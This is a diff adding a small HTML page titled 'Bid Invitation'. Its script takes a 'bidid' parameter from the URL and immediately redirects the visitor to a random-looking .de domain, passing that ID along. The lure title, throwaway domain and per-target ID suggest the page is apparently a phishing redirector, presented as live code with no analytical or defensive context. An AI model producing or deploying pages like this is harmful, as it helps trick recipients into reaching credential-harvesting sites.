@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Bid Invitation</title>
+</head>
+<body>
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const bidid = params.get("bidid");
+
+  if (bidid && /^[A-Za-z0-9_-]{8,128}$/.test(bidid)) {
+    window.location.replace(
+      "https://zcbxaqmrvtnlypkwejduisrfhn.de/companybids.php?bidid=" +
+      encodeURIComponent(bidid)
+    );
+  }
+</script>
+</body>
+</html>
